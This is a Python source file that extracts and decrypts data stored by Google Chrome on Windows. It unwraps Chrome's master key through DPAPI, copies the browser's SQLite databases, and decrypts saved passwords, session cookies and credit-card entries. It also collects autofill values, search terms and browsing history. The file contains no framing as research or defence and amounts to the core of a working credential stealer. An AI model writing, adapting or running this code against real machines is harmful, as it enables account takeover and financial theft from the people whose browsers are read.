import os
import json
import shutil
import base64
import sqlite3
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime, timezone, timedelta


class Chrome:
    def __init__(self):
        self._user_data = os.getenv(
            "LOCALAPPDATA") + "\\Google\\Chrome\\User Data"
        self._master_key = self._get_master_key()

    def _get_master_key(self):
        with open(self._user_data + "\\Local State", "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            master_key = base64.b64decode(
                local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

    def chrome_date_and_time(self,chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    @staticmethod
    def _decrypt(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return str(e)

    @staticmethod
    def _convert_time(time):
        epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
        code_stamp = epoch + timedelta(microseconds=time)
        return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')

    def passwords(self):
        try:
            login_db = self._user_data + "\\Default\\Login Data"
            login_db_copy = os.getenv("TEMP") + "\\Login.db"
            shutil.copy2(login_db, login_db_copy)
            conn = sqlite3.connect(login_db_copy)
            cursor = conn.cursor()
            password_data = ""
            try:
                cursor.execute(
                    "SELECT action_url, username_value, password_value, date_created, date_last_used FROM logins")
                for item in cursor.fetchall():
                    url = item[0]
                    username = item[1]
                    encrypted_password = item[2]
                    decrypted_password = self._decrypt(
                        encrypted_password, self._master_key)
                    date_of_creation = item[3]
                    last_usuage = item[4]
                    if username or decrypted_password:
                        data = f"URLs: {url}\n"
                        data += f"Username: {username}\n"
                        data += f"Password: {decrypted_password}\n"
                        
                    else:
                        continue
                    
                    if date_of_creation != 86400000000 and date_of_creation:
                        data += f"Creation date: {str(self.chrome_date_and_time(date_of_creation))}\n"
                    
                    if last_usuage != 86400000000 and last_usuage:
                        data +=f"Last Used: {str(self.chrome_date_and_time(last_usuage))} --\n\n"
                    password_data += data
            except sqlite3.Error:
                pass
            cursor.close()
            conn.close()
            os.remove(login_db_copy)
            return password_data
        except Exception as e:
            print(f"[!]Error: {e}")

    def cookies(self):
        try:
            cookies_db = self._user_data + "\\Default\\Network\\cookies"
            cookies_db_copy = os.getenv("TEMP") + "\\Cookies.db"
            shutil.copy2(cookies_db, cookies_db_copy)
            conn = sqlite3.connect(cookies_db_copy)
            cursor = conn.cursor()
            cookies = ""
            try:
                cursor.execute(
                    "SELECT host_key, name, encrypted_value from cookies")
                for item in cursor.fetchall():
                    host = item[0]
                    user = item[1]
                    decrypted_cookie = self._decrypt(item[2], self._master_key)
                    cookie_data = "Cookies data\n"
                    cookie_data += f"Host key: {host}\n"
                    cookie_data += f"Name: {user}\n"
                    cookie_data += f"Value decrypt: {decrypted_cookie}\n\n"
                    cookies += cookie_data
            except sqlite3.Error:
                pass
            cursor.close()
            conn.close()
            os.remove(cookies_db_copy)
            return cookies
        except Exception as e:
            print(f"[!]Error: {e}")

    def web_data(self):
        try:
            web_data_db = self._user_data + "\\Default\\Web Data"
            web_data_db_copy = os.getenv("TEMP") + "\\Web.db"
            shutil.copy2(web_data_db, web_data_db_copy)
            conn = sqlite3.connect(web_data_db_copy)
            cursor = conn.cursor()

            autofill_data = ""
            credit_card_info = []

            try:
                cursor.execute("SELECT name, value FROM autofill")

                for item in cursor.fetchall():
                    name = item[0]
                    value = item[1]
                    message = "="*10+"Autofill data"+"="*10 + "\n"
                    message += f"Data name: {name}\n"
                    message += f"Data value: {value}\n\n"
                    autofill_data += message
                    # autofill_data.append((name, message += f"Data:{name}\n"))

                cursor.execute("SELECT * FROM credit_cards")

                for item in cursor.fetchall():
                    username = item[1]
                    encrypted_password = item[4]
                    decrypted_password = self._decrypt(
                        encrypted_password, self._master_key)
                    expire_mon = item[2]
                    expire_year = item[3]
                    message = "Credit card info\n"
                    message += f"Username: {username}\n"
                    message += f"Password: {decrypted_password}\n"
                    message += f"Expired month: {expire_mon}\n"
                    message += f"Expired year: {expire_year}\n\n"
                    credit_card_info += message
                    # credit_card_info.append((username, decrypted_password, expire_mon, expire_year))

            except sqlite3.Error:
                pass

            cursor.close()
            conn.close()
            os.remove(web_data_db_copy)

            return autofill_data, credit_card_info

        except Exception as e:
            print(f"[!]Error: {e}")

    def history(self):
        search_terms = []
        web_history = ""
        try:
            history_db = self._user_data + "\\Default\\History"
            history_db_copy = os.getenv("TEMP") + "\\History.db"
            shutil.copy2(history_db, history_db_copy)
            conn = sqlite3.connect(history_db_copy)
            cursor = conn.cursor()

            try:
                cursor.execute('SELECT term FROM keyword_search_terms')
                search_terms = [item[0] for item in cursor.fetchall()]

                cursor.execute('SELECT title, url, last_visit_time FROM urls')
                for item in cursor.fetchall():
                    title = item[0]
                    url = item[1]
                    last_time = self._convert_time(item[2])
                    message = f"\Title: {title}\n"
                    message += f"URL: {url}\n"
                    message += f"Last Time Visit: {last_time}\n\n"
                    web_history += message
                    # web_history.append({'Title': title, 'Url': url, 'Last Time Visit': last_time})

            except sqlite3.Error:
                pass

            cursor.close()
            conn.close()
            os.remove(history_db_copy)
        except Exception as e:
            print(f"[!]Error: {e}")

        return search_terms, web_history

# def password():
#     chrome = Chrome()
#     password_data = chrome.passwords()
    
#     login_info_sets = password_data.split("\n\n")

#     for login_info in login_info_sets:
#         login_info_lines = login_info.split("\n")
#         for line in login_info_lines:
#             if not line.startswith("Password"):
                
#                 print(line) 
#             lines = line.startswith("Password")
#             print(lines)
# password() 
# chrome = Chrome() 
# password_lines_show = [line for line in  chrome.passwords().split('\n') if line.startswith("Password")]
# password_lines_hide = [line for line in  chrome.passwords().split('\n') if not line.startswith("Password")]

# print(password_lines_hide)    
# if __name__ == "__main__":
#     chrome = Chrome()
    # password_data = chrome.passwords()
    
    # login_info_sets = password_data.split("\n\n")

    # for login_info in login_info_sets:
    #     login_info_lines = login_info.split("\n")
    #     for line in login_info_lines:
    #         if line.startswith("Password"):
    #             continue
    #         print(line)
